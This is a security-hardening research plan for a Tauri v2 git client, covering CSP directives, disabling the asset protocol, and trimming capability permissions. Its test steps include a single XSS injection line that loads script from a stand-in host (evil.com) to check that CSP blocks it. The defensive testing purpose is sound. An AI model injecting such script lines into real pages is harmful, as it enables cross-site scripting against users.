# Phase 31: Security Hardening - Expert Developer Research

**Researched:** 2026-02-09
**Domain:** Tauri v2 security configuration (CSP, capabilities, asset protocol)
**Confidence:** HIGH
**Audience:** Expert developer implementing SEC-01, SEC-02, SEC-03

## Summary

FlowForge currently runs with **zero security hardening**: CSP is `null`, asset protocol scope is `["**"]` (wildcard), and capabilities use broad `default` permission sets. This phase addresses all three issues as prerequisites before any v1.5 extension work begins.

The app has specific external dependencies that must be whitelisted: Monaco Editor loads from `cdn.jsdelivr.net`, the NuGet viewer fetches from `azuresearch-usnc.nuget.org` and `api.nuget.org`, gitignore templates are fetched from `api.github.com`, and framer-motion injects inline styles for animations. An inline script in `index.html` handles FOUC prevention and must be hashed by Tauri's compile-time CSP injection.

**Primary recommendation:** Enable a strict CSP in `tauri.conf.json` with explicit whitelisting for the five external domains, narrow the asset protocol scope to the user's repository directory, and audit `default.json` capabilities to remove unused permissions (menu, tray, image).

## Current State Analysis

### File: `src-tauri/tauri.conf.json`

```json
"security": {
  "csp": null,
  "assetProtocol": {
    "enable": true,
    "scope": ["**"]
  }
}
```

**Issues identified:**
1. `"csp": null` -- CSP completely disabled. No protection against XSS.
2. `"scope": ["**"]` -- Asset protocol grants access to the entire filesystem.
3. No `devCsp` configured -- development and production will share the same policy.

### File: `src-tauri/capabilities/default.json`

```json
{
  "identifier": "default",
  "description": "Default capabilities for FlowForge",
  "windows": ["main"],
  "permissions": [
    "core:default",
    "opener:default",
    "dialog:default",
    "store:default",
    "core:window:default",
    "window-state:default"
  ]
}
```

**Issues identified:**
1. `core:default` includes `core:tray:default`, `core:menu:default`, `core:image:default` -- the app has no tray icon, no native menus, and no image handling through Tauri's image module. These grant unnecessary permissions.
2. `core:window:default` is listed twice -- once inside `core:default` and once explicitly. The explicit one is redundant.
3. All plugins use `*:default` which is appropriate for their usage patterns (opener is used for `openUrl`/`revealItemInDir`, dialog is used for folder selection, store is used for preferences persistence, window-state is used for remembering window position/size).

### External Network Dependencies (from codebase analysis)

| Source | Domains | Used By | Direction |
|--------|---------|---------|-----------|
| Monaco Editor CDN | `cdn.jsdelivr.net` | `src/lib/monacoTheme.ts` | script-src, connect-src |
| NuGet API | `azuresearch-usnc.nuget.org`, `api.nuget.org` | `src/components/viewers/NugetPackageViewer.tsx` | connect-src |
| GitHub API | `api.github.com` | `src-tauri/src/git/gitignore.rs` | Rust-side only (reqwest) |
| NuGet website | `www.nuget.org` | NugetPackageViewer links | Not needed in CSP |

**Key insight:** The GitHub API calls happen Rust-side via `reqwest` and do NOT go through the webview. They are not affected by CSP. Only the Monaco CDN and NuGet API calls happen from the frontend and need CSP whitelisting.

### Inline Script in `index.html`

```html
<script>
    (function () {
        const stored = localStorage.getItem("flowforge-theme");
        // ... theme detection logic
        document.documentElement.className = theme;
    })();
</script>
```

This FOUC-prevention script is inline. Tauri's compile-time CSP injection will automatically hash this script and add the hash to `script-src`. No manual intervention needed.

### Inline Styles in React Components

22 files use framer-motion `motion.*` components which inject inline `style` attributes for animations. Additionally, ~25 instances of `style={...}` exist across the codebase for dynamic positioning, sizing, and colors.

**CSP impact:** `style-src` must include `'unsafe-inline'` to allow these. This is standard practice -- even Tauri's own CSP example uses `'unsafe-inline'` in `style-src`.

## Architecture Patterns

### Pattern 1: CSP Configuration in Tauri v2
**What:** Tauri v2 supports CSP as either a string or a directive object in `tauri.conf.json`. At compile time, Tauri parses all frontend assets and automatically injects nonce and hash sources for local scripts and styles.
**Confidence:** HIGH (verified via Context7 and official Tauri docs)

```json
{
  "app": {
    "security": {
      "csp": {
        "default-src": "'self' customprotocol: asset:",
        "script-src": "'self' https://cdn.jsdelivr.net",
        "connect-src": "ipc: http://ipc.localhost https://azuresearch-usnc.nuget.org https://api.nuget.org",
        "font-src": "'self' data:",
        "img-src": "'self' asset: http://asset.localhost blob: data:",
        "style-src": "'unsafe-inline' 'self'"
      },
      "devCsp": {
        "default-src": "'self' customprotocol: asset:",
        "script-src": "'self' 'unsafe-eval' https://cdn.jsdelivr.net",
        "connect-src": "ipc: http://ipc.localhost http://localhost:* https://azuresearch-usnc.nuget.org https://api.nuget.org",
        "font-src": "'self' data:",
        "img-src": "'self' asset: http://asset.localhost blob: data:",
        "style-src": "'unsafe-inline' 'self'"
      }
    }
  }
}
```

**Key points:**
- `ipc:` and `http://ipc.localhost` are required for Tauri's IPC mechanism
- `customprotocol:` and `asset:` are required for Tauri's custom protocol and asset loading
- `http://asset.localhost` is the HTTP-based asset protocol URL on Windows
- `devCsp` allows `'unsafe-eval'` for Vite HMR and `http://localhost:*` for the dev server
- Tauri automatically appends nonce/hash values at compile time -- do NOT add them manually

### Pattern 2: Asset Protocol Scope
**What:** The `assetProtocol.scope` restricts which filesystem paths can be served via Tauri's asset protocol. It uses glob patterns.
**Confidence:** HIGH (verified via Context7)

The app does NOT currently use `convertFileSrc()` or the asset protocol from the frontend -- grep found zero usage. The asset protocol is enabled with wildcard scope but appears unused. The `protocol-asset` feature IS enabled in `Cargo.toml`.

**Options:**
1. **Disable entirely** if truly unused: `"enable": false, "scope": []`
2. **Scope to app data** if needed later: `"scope": ["$APPDATA/**", "$RESOURCE/**"]`
3. **Scope to opened repository** -- not possible statically; would need runtime scope modification

**Recommendation:** Since the asset protocol is unused in the current codebase but the feature flag is enabled in Cargo.toml, disable it for now. If Phase 31+ features need it, re-enable with narrow scope.

### Pattern 3: Fine-Grained Capability Permissions
**What:** Replace `core:default` with only the specific module defaults the app actually uses.
**Confidence:** HIGH (verified via Context7 permission reference)

Current `core:default` expands to:
- `core:app:default` -- NEEDED (app version, name)
- `core:event:default` -- NEEDED (Tauri events for IPC, file watcher)
- `core:image:default` -- NOT NEEDED (no Tauri image API usage)
- `core:menu:default` -- NOT NEEDED (no native menu usage)
- `core:path:default` -- NEEDED (path resolution for dialogs)
- `core:resources:default` -- NEEDED (resource loading)
- `core:tray:default` -- NOT NEEDED (no system tray usage)
- `core:webview:default` -- NEEDED (webview management)
- `core:window:default` -- NEEDED (window management, already explicit)

### Pattern 4: Extensibility-Focused Capability Structure
**What:** For the upcoming v1.5 extension system, structure capabilities so extensions can request specific permissions that get merged at build time or dynamically at runtime.
**Confidence:** MEDIUM (extrapolated from Tauri v2 capability system docs)

Tauri v2 supports multiple capability files in the `capabilities/` directory. Each file can target specific windows or webviews. The recommended pattern for extensibility:

```
src-tauri/capabilities/
  default.json          -- Base app permissions (current)
  github-extension.json -- GitHub extension permissions (future)
```

Each extension capability file can be conditionally included via the `capabilities` array in `tauri.conf.json`:

```json
{
  "app": {
    "security": {
      "capabilities": ["default", "github-extension"]
    }
  }
}
```

If `capabilities` is empty or not set, ALL files in `capabilities/` are included. For dynamic registration, extensions would need to declare required permissions in their manifest, and the build system would generate capability files.

## Don't Hand-Roll

| Problem | Don't Build | Use Instead | Why |
|---------|-------------|-------------|-----|
| CSP nonce generation | Custom nonce injection | Tauri's compile-time injection | Tauri automatically hashes/nonces all local scripts at build time |
| Permission validation | Custom IPC permission checks | Tauri's capability system | Already built into the IPC layer; commands without permissions are blocked |
| Asset path validation | Manual path traversal checks | Tauri's scope system | Scope patterns handle glob-based path restriction natively |
| Script integrity checking | SRI hash computation | Tauri's CSP hash injection | Build-time process, not a runtime concern |

**Key insight:** Tauri v2 provides a complete security framework. The implementation work is configuration, not code.

## Common Pitfalls

### Pitfall 1: Monaco Editor CDN Blocked by CSP
**What goes wrong:** Monaco Editor loads JS/CSS from `cdn.jsdelivr.net` via dynamic `<script>` tags. A strict CSP without this domain in `script-src` causes Monaco to fail silently or show a blank editor.
**Why it happens:** Monaco's loader dynamically injects script tags at runtime, which CSP evaluates against `script-src`.
**How to avoid:** Add `https://cdn.jsdelivr.net` to `script-src`. This is unavoidable while using the CDN-loaded Monaco.
**Warning signs:** Editor panel shows blank/white area, console shows CSP violation errors.
**Long-term consideration:** Bundle Monaco locally instead of CDN loading to eliminate this external dependency. This is out of scope for Phase 31.

### Pitfall 2: Vite HMR Breaks in Development
**What goes wrong:** Vite's Hot Module Replacement uses `eval()` and WebSocket connections. A production CSP applied during development blocks HMR.
**Why it happens:** If `devCsp` is not set, Tauri uses the production `csp` during development too.
**How to avoid:** Always configure `devCsp` separately with `'unsafe-eval'` in `script-src` and `http://localhost:*` in `connect-src`.
**Warning signs:** Changes not reflected in dev mode, WebSocket connection errors in console.

### Pitfall 3: Inline Styles Blocked
**What goes wrong:** React components using `style={...}` props and framer-motion animations stop working.
**Why it happens:** `style-src` without `'unsafe-inline'` blocks all inline styles.
**How to avoid:** Include `'unsafe-inline'` in `style-src`. This is the standard approach -- Tauri's own example CSP uses it.
**Warning signs:** Layout broken, animations not working, console CSP violations for inline styles.

### Pitfall 4: NuGet Viewer Fetch Fails Silently
**What goes wrong:** `NugetPackageViewer.tsx` uses browser `fetch()` to call NuGet APIs. Without proper `connect-src`, these requests are blocked.
**Why it happens:** `connect-src` controls which origins `fetch()`/`XMLHttpRequest` can reach.
**How to avoid:** Add `https://azuresearch-usnc.nuget.org` and `https://api.nuget.org` to `connect-src`.
**Warning signs:** NuGet package viewer shows "Could not fetch package info" error.

### Pitfall 5: IPC Protocol Differences Between Platforms
**What goes wrong:** Windows uses `http://ipc.localhost` and `http://asset.localhost` while macOS/Linux use `ipc:` and `asset:` custom protocols.
**Why it happens:** Platform-specific WebView implementations handle custom protocols differently.
**How to avoid:** Include BOTH protocol formats in CSP: `ipc: http://ipc.localhost` for connect-src, `asset: http://asset.localhost` for img-src/default-src.
**Warning signs:** App works on macOS but shows white screen on Windows (or vice versa).

### Pitfall 6: Removing `core:window:default` Breaks Window State Plugin
**What goes wrong:** The `window-state` plugin needs window management permissions to save/restore window position and size.
**Why it happens:** `window-state:default` depends on `core:window:default` permissions being available.
**How to avoid:** Keep `core:window:default` in capabilities. The explicit listing is actually fine since Tauri deduplicates permissions.
**Warning signs:** Window doesn't remember its size/position between launches.

## Tailwind v4 + CSP Compatibility

**Confidence:** HIGH (verified by codebase analysis)

Tailwind CSS v4 with the `@tailwindcss/vite` plugin compiles CSS at build time into a standard CSS file linked via `<link>` tag. It does NOT inject inline styles at runtime. The Tailwind classes (`bg-ctp-mantle`, `text-sm`, etc.) are all pre-compiled.

**What IS affected:**
- React's `style={...}` prop (used in ~25 places in FlowForge) -- requires `'unsafe-inline'` in `style-src`
- framer-motion's animation system (used in 22 files) -- injects inline `transform`/`opacity` styles
- Dynamic CSS variables via `element.style.setProperty()` -- if used

**What is NOT affected:**
- Tailwind utility classes -- compiled to CSS file
- CSS custom properties in `index.css` (`--catppuccin-color-*`) -- in stylesheet
- `@keyframes` animations -- in stylesheet

**Conclusion:** `'unsafe-inline'` in `style-src` is required regardless of Tailwind. Tailwind v4 itself is CSP-compatible.

## Concrete File Changes

### 1. `src-tauri/tauri.conf.json` (SEC-01, SEC-02)

**Change:** Add strict CSP, devCsp, and narrow asset protocol scope.

```json
{
  "app": {
    "security": {
      "csp": {
        "default-src": "'self' customprotocol: asset:",
        "script-src": "'self' https://cdn.jsdelivr.net",
        "connect-src": "ipc: http://ipc.localhost https://azuresearch-usnc.nuget.org https://api.nuget.org",
        "font-src": "'self' data:",
        "img-src": "'self' asset: http://asset.localhost blob: data:",
        "style-src": "'unsafe-inline' 'self'",
        "worker-src": "'self' blob:"
      },
      "devCsp": {
        "default-src": "'self' customprotocol: asset:",
        "script-src": "'self' 'unsafe-eval' https://cdn.jsdelivr.net",
        "connect-src": "ipc: http://ipc.localhost http://localhost:* ws://localhost:* https://azuresearch-usnc.nuget.org https://api.nuget.org",
        "font-src": "'self' data:",
        "img-src": "'self' asset: http://asset.localhost blob: data:",
        "style-src": "'unsafe-inline' 'self'",
        "worker-src": "'self' blob:"
      },
      "assetProtocol": {
        "enable": false,
        "scope": []
      }
    }
  }
}
```

**Rationale:**
- `script-src`: `'self'` for bundled scripts (Tauri auto-hashes), `https://cdn.jsdelivr.net` for Monaco CDN
- `connect-src`: `ipc:` + `http://ipc.localhost` for Tauri IPC (cross-platform), NuGet API domains for package viewer
- `font-src`: `'self'` for Geist/JetBrains Mono fonts bundled via `@fontsource-variable`, `data:` for inline font data URIs
- `img-src`: `'self'` for local images, `asset:` + `http://asset.localhost` for potential asset protocol, `blob:` and `data:` for dynamically generated images
- `style-src`: `'unsafe-inline'` for React inline styles and framer-motion, `'self'` for compiled CSS
- `worker-src`: `'self' blob:` for Monaco web workers
- `devCsp`: Adds `'unsafe-eval'` for Vite HMR, `http://localhost:*` and `ws://localhost:*` for dev server
- Asset protocol: Disabled since grep found zero frontend usage of `convertFileSrc()` or asset protocol URLs

### 2. `src-tauri/capabilities/default.json` (SEC-03)

**Change:** Replace `core:default` with specific module defaults, remove redundant `core:window:default`.

```json
{
  "$schema": "../gen/schemas/desktop-schema.json",
  "identifier": "default",
  "description": "Minimum required capabilities for FlowForge git client",
  "windows": ["main"],
  "permissions": [
    "core:app:default",
    "core:event:default",
    "core:path:default",
    "core:resources:default",
    "core:webview:default",
    "core:window:default",
    "opener:default",
    "dialog:default",
    "store:default",
    "window-state:default"
  ]
}
```

**Removed permissions:**
- `core:default` -- replaced with specific module defaults (5 modules instead of 9)
- `core:image:default` -- no Tauri image API usage found
- `core:menu:default` -- no native menu usage found
- `core:tray:default` -- no system tray usage found
- Duplicate `core:window:default` -- was listed both inside `core:default` and explicitly

**Kept permissions:**
- `core:app:default` -- app name/version queries
- `core:event:default` -- Tauri event system (used by file watcher, IPC channels)
- `core:path:default` -- path resolution for dialog plugin
- `core:resources:default` -- resource loading
- `core:webview:default` -- webview management
- `core:window:default` -- window management (required by window-state plugin)
- `opener:default` -- `openUrl()` for markdown links, `revealItemInDir()` for worktrees
- `dialog:default` -- folder picker for repository open/clone
- `store:default` -- persistent preferences storage
- `window-state:default` -- remember window size/position

### 3. `src-tauri/Cargo.toml` (SEC-02, conditional)

**Change:** If asset protocol is disabled, remove the `protocol-asset` feature flag.

```toml
# Before:
tauri = { version = "2", features = ["protocol-asset"] }

# After:
tauri = { version = "2", features = [] }
```

**Note:** Only do this if the asset protocol is confirmed unused. If future phases need it, keep the feature but with narrow scope.

### 4. No Rust Code Changes Required

The CSP is configured entirely in `tauri.conf.json`. Tauri injects it at compile time into all HTML files. No Rust-side code changes are needed for CSP enforcement.

The capability system is enforced by the Tauri runtime based on `default.json`. No Rust-side code changes are needed.

### 5. No React/Frontend Code Changes Required

The CSP whitelists all current external dependencies. No frontend code needs modification. The inline script in `index.html` is automatically hashed by Tauri at compile time.

### 6. No Vite Config Changes Required

The Vite configuration does not need changes. Tailwind v4's Vite plugin produces standard CSS files. The dev server runs on `localhost:1420` which is covered by the `devCsp`.

## Verification Strategy

### Testing CSP (SEC-01)

1. **Build and run production build**: `npm run tauri build` then launch the app
2. **Open DevTools** (Cmd+Shift+I) and check Console for CSP violation errors
3. **Verify these work:**
   - Open a repository (tests IPC)
   - View a file in Monaco editor (tests CDN script loading)
   - View a .nupkg file (tests NuGet API fetch)
   - Create a commit with framer-motion animations visible (tests inline styles)
   - Check that fonts render correctly (tests font-src)
4. **Verify these are blocked:**
   - Manually try to inject a script via console: `document.write('<script src="http://evil.com/xss.js"></script>')` should be blocked

### Testing Asset Protocol (SEC-02)

1. **If disabled:** Verify the app works without asset protocol enabled
2. **If scoped:** Verify only allowed paths are accessible

### Testing Capabilities (SEC-03)

1. **Run the app** and verify all features work:
   - Repository open/close
   - File staging/unstaging
   - Commit creation
   - Branch operations
   - Remote operations (fetch/push/pull)
   - Stash operations
   - Tag operations
   - Settings persistence
   - Window state persistence
   - Opening URLs in browser
   - Folder reveal in file manager
   - Gitflow operations
2. **Check that no permission errors appear in console or Rust logs**

### Development Mode Testing

1. **Run `npm run tauri dev`** and verify:
   - Vite HMR works (edit a component, see changes)
   - Monaco editor loads
   - NuGet viewer works
   - No CSP errors in console

## State of the Art

| Old Approach | Current Approach | When Changed | Impact |
|-------------|------------------|--------------|--------|
| Tauri v1 allowlist | Tauri v2 capabilities/permissions | Tauri 2.0 (2024) | Fine-grained per-window permissions |
| String CSP only | String or directive object CSP | Tauri 2.0 | Easier to maintain as structured JSON |
| No compile-time CSP | Automatic nonce/hash injection | Tauri 2.0 | Scripts are automatically secured |
| `withGlobalTauri` exposure | Explicit IPC-only access | Tauri 2.0 | Better security boundary |

## Open Questions

1. **Monaco CDN vs local bundling**
   - What we know: Monaco loads from `cdn.jsdelivr.net`, requiring script-src whitelist
   - What's unclear: Whether bundling Monaco locally would improve security posture significantly
   - Recommendation: Out of scope for Phase 31. The CDN whitelist is acceptable. Consider local bundling in a future phase to eliminate external script dependency entirely.

2. **Asset protocol future need**
   - What we know: Asset protocol is currently unused but feature flag is enabled
   - What's unclear: Whether any v1.5 feature (GitHub extension, image diff viewer) will need it
   - Recommendation: Disable for now. Re-enable with narrow scope when a concrete use case arises.

3. **`worker-src` for Monaco web workers**
   - What we know: Monaco editor uses web workers for syntax highlighting
   - What's unclear: Whether CDN-loaded Monaco creates workers from blob URLs or fetched scripts
   - Recommendation: Include `'self' blob:` in `worker-src` to cover both cases. Verify during testing.

## Sources

### Primary (HIGH confidence)
- Context7 `/websites/v2_tauri_app` -- CSP configuration, SecurityConfig reference, capability permissions
- [Tauri v2 CSP Documentation](https://v2.tauri.app/security/csp/) -- CSP directive syntax, automatic nonce/hash injection
- [Tauri v2 Security Overview](https://v2.tauri.app/security/) -- Security model, trust boundaries
- [Tauri v2 Configuration Reference](https://v2.tauri.app/reference/config/) -- SecurityConfig schema, devCsp, assetProtocol
- [Tauri v2 Core Permissions Reference](https://v2.tauri.app/reference/acl/core-permissions) -- What core:default includes
- Project codebase analysis -- actual usage patterns of asset protocol, external domains, inline styles

### Secondary (MEDIUM confidence)
- [Tauri v2 Blog: Permission System Architecture](https://v2.tauri.app/blog/tauri-20) -- Capability system design rationale
- [Tailwind CSS v4 Release](https://tailwindcss.com/blog/tailwindcss-v4) -- Build-time CSS compilation
- [Tailwind CSP Discussion #13326](https://github.com/tailwindlabs/tailwindcss/discussions/13326) -- Vite plugin style injection

### Tertiary (LOW confidence)
- Web search results on framer-motion inline styles and CSP -- needs validation during testing

## Metadata

**Confidence breakdown:**
- CSP configuration: HIGH -- verified via Context7 and official Tauri v2 docs, matches current project structure
- Capability audit: HIGH -- verified available permissions via Context7, cross-referenced with actual codebase usage via grep
- Asset protocol scope: HIGH -- grep confirms zero frontend usage of asset protocol APIs
- Tailwind v4 compatibility: HIGH -- verified via codebase analysis that all Tailwind usage is class-based, compiled at build time
- Inline style handling: HIGH -- codebase grep shows exact files/lines with `style={...}`, known framer-motion pattern
- DevCsp requirements: MEDIUM -- Vite HMR requirements are well-documented but exact behavior with Tauri v2 needs dev-mode validation
- Monaco worker-src: MEDIUM -- standard pattern but exact CDN loader behavior should be verified during testing

**Research date:** 2026-02-09
**Valid until:** 2026-03-09 (30 days -- stable domain, Tauri v2 is GA)
